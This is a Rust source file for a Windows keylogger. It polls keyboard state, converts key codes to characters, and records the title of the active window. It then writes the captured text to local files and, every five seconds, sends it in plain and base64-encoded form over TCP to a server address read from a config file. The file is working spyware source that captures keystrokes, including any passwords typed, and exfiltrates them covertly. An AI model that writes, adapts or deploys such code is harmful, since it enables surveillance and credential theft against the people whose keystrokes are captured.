use base64;
use device_query::{DeviceQuery, DeviceState, Keycode};
use std::convert::TryFrom;
use std::fs::OpenOptions;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::mpsc::channel;
use std::sync::Arc;
use std::sync::Mutex;
use std::thread;
use std::time::Duration;
use windows::core::Result;
use windows::core::PWSTR;
use windows::Win32::System::Threading::GetCurrentThreadId;
use windows::Win32::UI::Input::KeyboardAndMouse::ToUnicodeEx;
use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetAsyncKeyState, GetKeyState, GetKeyboardLayout, GetKeyboardState, ToUnicode,
};
use windows::Win32::UI::WindowsAndMessaging::{
    GetForegroundWindow, GetWindowTextW, GetWindowThreadProcessId,
};

// Key represents a single key entered by the user
#[derive(Debug, Clone)]
struct Key {
    keycode: i32,         // The keycode of the key
    char: Option<char>,   // Unicode character of the key
    is_control: bool,     // Is the key a control key (e.g. shift, ctrl, alt, etc.)
    window_title: String, // The title of the window that was active when the key was pressed
}

/*impl Key {
    fn new() -> Self {
        Self {
            is_control: true,
            char: None,
            keycode: 0,
        }
    }
}
*/

fn main() {
    let (tx1, rx1) = channel::<Key>();
    let (tx2, rx2) = channel::<Key>();

    // let keys1 = Arc::new(Mutex::new(vec![]));
    let keys1 = Arc::new(Mutex::new(Vec::<Key>::new()));

    // Collection thread
    // let h1 = thread::spawn(move || );

    // Print all received keys to a file for debugging
    let h2 = thread::spawn(move || {
        let mut file = OpenOptions::new()
            .create(true)
            .write(true)
            .append(true)
            .open("pressed.txt")
            .unwrap();

        for received in rx1 {
            writeln!(file, "{:?}", received).unwrap();
        }
    });

    let h3 = thread::spawn({
        let keys1 = Arc::clone(&keys1);
        move || loop {
            let mut pressed_full = OpenOptions::new()
                .create(true)
                .write(true)
                .append(true)
                .open("pressed_full.txt")
                .unwrap();
            let mut keys_string = String::new();

            {
                let mut keys1 = keys1.lock().unwrap();
                for key in keys1.drain(..) {
                    if let Some(r) = key.char {
                        keys_string.push(r);
                    }
                }
            }
            if keys_string.len() > 0 {
                let keys_base64 = base64::encode(&keys_string);
                writeln!(pressed_full, "text: {}", keys_string);
                writeln!(pressed_full, "base64: {}", keys_base64);
                writeln!(pressed_full, "=======================================");

                let address = get_address();
                let mut stream = TcpStream::connect(address);
                match stream {
                    Ok(s) => {
                        let mut stream = s;
                        writeln!(stream, "{}", keys_string).unwrap();
                        writeln!(stream, "{}", keys_base64).unwrap();
                    }
                    Err(e) => {
                        // println!("Error connecting to server: {}", e);
                        continue;
                    }
                }
            };

            thread::sleep(Duration::from_secs(5));
        }
    });

    loop {
        let next_key = get_next();

        tx1.send(next_key.clone()).unwrap();
        tx2.send(next_key.clone()).unwrap();

        {
            let mut keys1 = keys1.lock().unwrap();
            keys1.push(next_key.clone());
        }

        // println!("next: {:?}", next_key);
    }
}

// Get TCP address from the ./address.txt file if it exists other wise return the default address
fn get_address() -> String {
    let mut address = String::new();
    let mut file = OpenOptions::new()
        .read(true)
        .open("address.txt")
        .unwrap_or_else(|_| {
            // println!("No address.txt file found, using default address");
            let mut df = OpenOptions::new()
                .create(true)
                .write(true)
                .open("address.txt")
                .unwrap();
            df.write(b"127.0.0.1:4000").unwrap();
            df
        });
    let res = file.read_to_string(&mut address);
    match res {
        Ok(_) => {
            // println!("address.txt file found, using address: {}", address);
            address
        }
        Err(e) => {
            // println!("Error reading address.txt file: {}", e);
            "127.0.0.1:4000".to_string()
        }
    }
}

fn get_next() -> Key {
    let mut keyboard_state = [0u8; 256];

    let next = wait_for_next_key();
    // println!("next: {:?}", next);
    let t = unsafe { GetKeyboardState(&mut keyboard_state) };

    // Get the handle to the foreground window
    let foreground_window = unsafe { GetForegroundWindow() };
    // Get the thread id of the foreground window
    let thread_id = unsafe { GetWindowThreadProcessId(foreground_window, None) };
    // Get the keyboard layout for the foreground thread
    let layout = unsafe { GetKeyboardLayout(thread_id) };
    let mut pwszbuff = [0u16; 1]; // Create a buffer
                                  // Use the correct arguments for ToUnicodeEx
    let code = unsafe {
        ToUnicodeEx(
            next as u32, // Use the key code as `wvirtkey`
            0, // `wscancode`, it's usually obtained from a WM_KEYDOWN or WM_KEYUP message.
            &keyboard_state,
            &mut pwszbuff, // Pass the buffer
            0,             // `wflags`, always 0 for this usage
            layout,
        )
    };
    // println!("typeing {}: {} kb: {:?}", i, code, layout);
    // println!(">>> buff {:?}",  pwszbuff);

    // Add the code to get the window title
    let mut window_title = vec![0u16; 1024]; // Create a buffer for the window title
    let title_length = unsafe { GetWindowTextW(foreground_window, &mut window_title) };
    window_title.resize(title_length as usize, 0); // Resize the vector to fit the title
    let window_title = String::from_utf16(&window_title).unwrap_or_default(); // Convert the title to a String

    // println!("Window title: {}", window_title); // Print the window title

    // let mut key = Key::new();
    // key.is_control = false;
    // key.keycode = next;

    let mut key = Key {
        keycode: next,
        char: None,
        is_control: false,
        window_title,
    };

    // let code_point: u32 = 1567; ///ssssfqwewerdfgrtasd
    let code_point: u32 = pwszbuff[0] as u32;
    if let Some(character) = char::from_u32(code_point) {
        // let character = character.to_string();
        if character.is_control() {
            // println!("{} is a control character", code_point);
            key.is_control = true;
        } else {
            key.char = Some(character);
            let character_string = character.to_string();
            // println!("{}", character_string);
        }
        // println!(">>> {}", character_string);
    } else {
        key.is_control = true;
        // println!("Invalid Unicode code point: {}", code_point);
    };

    key
}

fn wait_for_next_key() -> i32 {
    let keycodes = get_main_key_codes();
    let mut last_key: Option<i32> = None;
    loop {
        for &key in keycodes.iter() {
            let key_code = unsafe { GetAsyncKeyState(key) };
            if key_code == 0 {
                if let Some(last) = last_key {
                    if last == key {
                        return key;
                    }
                }
                continue;
            }

            // The shift is for only pressed key
            if key_code != -32768 || key_code & (1 << 15) == 0 {
                continue;
            }
            last_key = Some(key);
        }
        thread::sleep(Duration::from_millis(5));
    }
}

fn get_main_key_codes() -> Vec<i32> {
    let mut keycodes = vec![];
    // Iterate from 0 to 255 inclusive
    for i in 0..=255 {
        if is_known_win_key(i) {
            keycodes.push(i);
        }
    }
    keycodes
}

fn is_known_win_key(win_key1: i32) -> bool {
    use std::collections::HashSet;
    use windows::Win32::UI::Input::KeyboardAndMouse::*;

    let known_keys: HashSet<VIRTUAL_KEY> = [
        VK_LBUTTON,
        VK_RBUTTON,
        VK_CANCEL,
        VK_MBUTTON,
        VK_XBUTTON1,
        VK_XBUTTON2,
        VK_BACK,
        VK_TAB,
        VK_CLEAR,
        VK_RETURN,
        VK_SHIFT,
        VK_CONTROL,
        VK_MENU,
        VK_PAUSE,
        VK_CAPITAL,
        VK_KANA,
        VK_HANGUEL,
        VK_HANGUL,
        VK_IME_ON,
        VK_JUNJA,
        VK_FINAL,
        VK_HANJA,
        VK_KANJI,
        VK_IME_OFF,
        VK_ESCAPE,
        VK_CONVERT,
        VK_NONCONVERT,
        VK_ACCEPT,
        VK_MODECHANGE,
        VK_SPACE,
        VK_PRIOR,
        VK_NEXT,
        VK_END,
        VK_HOME,
        VK_LEFT,
        VK_UP,
        VK_RIGHT,
        VK_DOWN,
        VK_SELECT,
        VK_PRINT,
        VK_EXECUTE,
        VK_SNAPSHOT,
        VK_INSERT,
        VK_DELETE,
        VK_HELP,
        // // Keys '0' to '9'
        // 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,
        // // Keys 'A' to 'Z'
        // 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,
        // 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52,
        // 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
        VK_LWIN,
        VK_RWIN,
        VK_APPS,
        VK_SLEEP,
        VK_NUMPAD0,
        VK_NUMPAD1,
        VK_NUMPAD2,
        VK_NUMPAD3,
        VK_NUMPAD4,
        VK_NUMPAD5,
        VK_NUMPAD6,
        VK_NUMPAD7,
        VK_NUMPAD8,
        VK_NUMPAD9,
        VK_MULTIPLY,
        VK_ADD,
        VK_SEPARATOR,
        VK_SUBTRACT,
        VK_DECIMAL,
        VK_DIVIDE,
        VK_F1,
        VK_F2,
        VK_F3,
        VK_F4,
        VK_F5,
        VK_F6,
        VK_F7,
        VK_F8,
        VK_F9,
        VK_F10,
        VK_F11,
        VK_F12,
        VK_F13,
        VK_F14,
        VK_F15,
        VK_F16,
        VK_F17,
        VK_F18,
        VK_F19,
        VK_F20,
        VK_F21,
        VK_F22,
        VK_F23,
        VK_F24,
        VK_NUMLOCK,
        VK_SCROLL,
        VK_LSHIFT,
        VK_RSHIFT,
        VK_LCONTROL,
        VK_RCONTROL,
        VK_LMENU,
        VK_RMENU,
        VK_BROWSER_BACK,
        VK_BROWSER_FORWARD,
        VK_BROWSER_REFRESH,
        VK_BROWSER_STOP,
        VK_BROWSER_SEARCH,
        VK_BROWSER_FAVORITES,
        VK_BROWSER_HOME,
        VK_VOLUME_MUTE,
        VK_VOLUME_DOWN,
        VK_VOLUME_UP,
        VK_MEDIA_NEXT_TRACK,
        VK_MEDIA_PREV_TRACK,
        VK_MEDIA_STOP,
        VK_MEDIA_PLAY_PAUSE,
        VK_LAUNCH_MAIL,
        VK_LAUNCH_MEDIA_SELECT,
        VK_LAUNCH_APP1,
        VK_LAUNCH_APP2,
        VK_OEM_1,
        VK_OEM_PLUS,
        VK_OEM_COMMA,
        VK_OEM_MINUS,
        VK_OEM_PERIOD,
        VK_OEM_2,
        VK_OEM_3,
        VK_OEM_4,
        VK_OEM_5,
        VK_OEM_6,
        VK_OEM_7,
        VK_OEM_8,
        VK_OEM_102,
        VK_PROCESSKEY,
        VK_PACKET,
        VK_ATTN,
        VK_CRSEL,
        VK_EXSEL,
        VK_EREOF,
        VK_PLAY,
        VK_ZOOM,
        VK_NONAME,
        VK_PA1,
        VK_OEM_CLEAR,
    ]
    .iter()
    .copied()
    .collect();
    let vk = VIRTUAL_KEY(win_key1 as u16);
    let control = known_keys.contains(&vk);
    if !control {
        return true;
    }

    let win_key = win_key1 as u8;
    match win_key as char {
        '0'..='9' | 'A'..='Z' => true,
        _ => false,
    }
}

fn is_known_win_key_bk3(win_key1: i32) -> bool {
    use std::collections::HashSet;
    use windows::Win32::UI::Input::KeyboardAndMouse::*;

    let known_keys: HashSet<VIRTUAL_KEY> = [
        // Function keys
        VK_F1,
        VK_F2,
        VK_F3,
        VK_F4,
        VK_F5,
        VK_F6,
        VK_F7,
        VK_F8,
        VK_F9,
        VK_F10,
        VK_F11,
        VK_F12,
        // Number keys '0' to '9'
        // (b'0' as u16)..=(b'9' as u16),

        // Alphabet keys 'A' to 'Z'
        // (b'A' as u16)..=(b'Z' as u16),

        // Other keys
        VK_ADD,
        VK_SUBTRACT,
        VK_DIVIDE,
        VK_MULTIPLY,
        VK_SPACE,
        VK_LCONTROL,
        VK_RCONTROL,
        VK_LSHIFT,
        VK_RSHIFT,
        VK_LMENU,
        VK_RMENU,
        VK_LWIN,
        VK_RWIN,
        VK_RETURN,
        VK_ESCAPE,
        VK_UP,
        VK_DOWN,
        VK_LEFT,
        VK_RIGHT,
        VK_BACK,
        VK_CAPITAL,
        VK_TAB,
        VK_HOME,
        VK_END,
        VK_PRIOR,
        VK_NEXT,
        VK_INSERT,
        VK_DELETE,
        VK_OEM_3,
        VK_OEM_MINUS,
        VK_OEM_PLUS,
        VK_OEM_4,
        VK_OEM_6,
        VK_OEM_5,
        VK_OEM_1,
        VK_OEM_7,
        VK_OEM_COMMA,
        VK_OEM_PERIOD,
        VK_OEM_2,
    ]
    .iter()
    .cloned()
    .flatten()
    .map(VIRTUAL_KEY)
    .collect();

    let win_key = VIRTUAL_KEY(win_key1 as u16);

    known_keys.contains(&win_key)
}

fn is_known_win_key_2(win_key1: i32) -> bool {
    use windows::Win32::UI::Input::KeyboardAndMouse::*;
    let win_key = VIRTUAL_KEY(win_key1 as u16);
    match win_key {
        VK_F1 => true,
        VK_F2 => true,
        VK_F3 => true,
        VK_F4 => true,
        VK_F5 => true,
        VK_F6 => true,
        VK_F7 => true,
        VK_F8 => true,
        VK_F9 => true,
        VK_F10 => true,
        VK_F11 => true,
        VK_F12 => true,
        VK_NUMPAD0 => true,
        VK_NUMPAD1 => true,
        VK_NUMPAD2 => true,
        VK_NUMPAD3 => true,
        VK_NUMPAD4 => true,
        VK_NUMPAD5 => true,
        VK_NUMPAD6 => true,
        VK_NUMPAD7 => true,
        VK_NUMPAD8 => true,
        VK_NUMPAD9 => true,
        VK_ADD => true,
        VK_SUBTRACT => true,
        VK_DIVIDE => true,
        VK_MULTIPLY => true,
        VK_SPACE => true,
        VK_LCONTROL => true,
        VK_RCONTROL => true,
        VK_LSHIFT => true,
        VK_RSHIFT => true,
        VK_LMENU => true,
        VK_RMENU => true,
        VK_LWIN => true,
        VK_RWIN => true,
        VK_RETURN => true,
        VK_ESCAPE => true,
        VK_UP => true,
        VK_DOWN => true,
        VK_LEFT => true,
        VK_RIGHT => true,
        VK_BACK => true,
        VK_CAPITAL => true,
        VK_TAB => true,
        VK_HOME => true,
        VK_END => true,
        VK_PRIOR => true,
        VK_NEXT => true,
        VK_INSERT => true,
        VK_DELETE => true,
        VK_OEM_3 => true,
        VK_OEM_MINUS => true,
        VK_OEM_PLUS => true,
        VK_OEM_4 => true,
        VK_OEM_6 => true,
        VK_OEM_5 => true,
        VK_OEM_1 => true,
        VK_OEM_7 => true,
        VK_OEM_COMMA => true,
        VK_OEM_PERIOD => true,
        VK_OEM_2 => true,

        _ => {
            let win_key = win_key.0 as u8;
            match win_key as char {
                '0'..='9' | 'A'..='Z' => true,
                _ => false,
            }
        }
    }
}

///// bk ///

fn main2() {
    let keys1 = Arc::new(Mutex::new(vec![]));
    let keys2 = Arc::new(Mutex::new(vec![]));

    // Collection thread
    let h1 = std::thread::spawn({
        let keys1 = keys1.clone();
        move || {
            loop {
                let next_key = get_next();
                // Push to keys1 and keys2
                {
                    let mut keys1 = keys1.lock().unwrap();
                    keys1.push(next_key.clone());
                }
                {
                    let mut keys2 = keys2.lock().unwrap();
                    keys2.push(next_key.clone());
                }
                println!("next: {:?}", next_key);
            }
        }
    });

    h1.join();
}
